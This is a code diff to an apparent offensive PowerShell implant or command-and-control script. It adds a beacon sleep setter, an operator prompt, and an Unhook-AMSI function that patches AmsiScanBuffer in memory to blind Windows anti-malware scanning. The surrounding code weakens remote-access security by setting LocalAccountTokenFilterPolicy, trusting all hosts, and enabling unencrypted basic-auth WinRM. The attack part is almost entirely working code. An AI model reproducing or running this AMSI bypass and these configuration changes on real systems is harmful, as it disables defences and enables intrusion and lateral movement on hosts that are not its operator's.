@@ -7,6 +7,26 @@ function Test-Win64() {
 function Test-Win32() {
     return [IntPtr]::size -eq 4
 }
+Function Beacon($sleeptime) {
+    if ($sleeptime.ToLower().Contains('m')) { 
+        $sleeptime = $sleeptime -replace 'm', ''
+        [int]$newsleep = $sleeptime 
+        [int]$newsleep = $newsleep * 60
+    }
+    elseif ($sleeptime.ToLower().Contains('h')) { 
+        $sleeptime = $sleeptime -replace 'h', ''
+        [int]$newsleep1 = $sleeptime 
+        [int]$newsleep2 = $newsleep1 * 60
+        [int]$newsleep = $newsleep2 * 60
+    }
+    elseif ($sleeptime.ToLower().Contains('s')) { 
+        $newsleep = $sleeptime -replace 's', ''
+    } else {
+        $newsleep = $sleeptime
+    }
+    $script:sleeptime = $newsleep
+}
+New-Alias SetBeacon Beacon
 Function Turtle($sleeptime) {
     if ($sleeptime.ToLower().Contains('m')) { 
         $sleeptime = $sleeptime -replace 'm', ''
@@ -41,6 +61,7 @@ Function CheckArchitecture
     else {
         Write-Output "Unknown Architecture Detected"
     }
+    get-process -id $pid -module |%{ if ($_.modulename -eq "amsi.dll") {echo "`n[+] AMSI Detected. Run Unhook-AMSI to unload Anti-Malware Scan Interface (AMSI)"} }
 }
 Function Get-Proxy {
     Get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
@@ -49,7 +70,8 @@ Function CheckVersionTwo
 {
     $psver = $PSVersionTable.psversion.Major
     if ($psver -ne '2') {
-        Write-Output "`n[+] Powershell version $psver detected. Run Invoke-DowngradeAttack to try using PS v2"
+        Write-Output "`n[+] Powershell version $psver detected. Run Inject-Shellcode with the v2 Shellcode"
+        Write-Output "[+] Warning AMSI, Constrained Mode, ScriptBlock/Module Logging could be enabled"
     }
 }
 $global:ImpUpgrade = $False
@@ -512,7 +534,7 @@ $password,
 [string]
 $computer
 )
-Invoke-Command -computer localhost -credential $getcreds -scriptblock { set-itemproperty -path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Value 1 -Type Dword}
+Invoke-command -computer localhost -credential $getcreds -scriptblock { set-itemproperty -path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Value 1 -Type Dword}
 Invoke-Command -Computer localhost -Credential $getcreds -Scriptblock {Set-Item WSMan:localhost\client\trustedhosts -value * -force}
 $command = "cmd /c powershell.exe -c Set-WSManQuickConfig -Force;Set-Item WSMan:\localhost\Service\Auth\Basic -Value $True;Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $True; Register-PSSessionConfiguration -Name Microsoft.PowerShell -Force"
 $PSS = ConvertTo-SecureString $password -AsPlainText -Force
@@ -640,7 +662,7 @@ elseif ((Test-Win32) -and (Test-Wow64)) {
         $processes64bit += $process
         $pobject = New-Object PSObject | Select ID, StartTime, Name, Path, Arch, UserName
         $pobject.Id = $process.Id
-        $pobject.StartTime = $process.StartTime
+        $pobject.StartTime = $process.starttime
         $pobject.Name = $process.Name
 		$pobject.Path = $process.Path
         $pobject.Arch = "x64"
@@ -723,4 +745,27 @@ Function Get-AllFirewallRules($path) {
     } else {
         $Rules
     }
+}
+Function Unhook-AMSI {
+    
+    $win32 = @"
+using System.Runtime.InteropServices;
+using System;
+public class Win32 {
+[DllImport("kernel32")]
+public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+[DllImport("kernel32")]
+public static extern IntPtr LoadLibrary(string name);
+[DllImport("kernel32")]
+public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect
+);
+}
+"@
+Add-Type $win32
+$ptr = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
+$b = 0
+[Win32]::VirtualProtect($ptr, [UInt32]5, 0x40, [Ref]$b)
+$buf = New-Object Byte[] 7
+$buf[0] = 0x66; $buf[1] = 0xb8; $buf[2] = 0x01; $buf[3] = 0x00; $buf[4] = 0xc2; $buf[5] = 0x18; $buf[6] = 0x00;
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 7)
 }
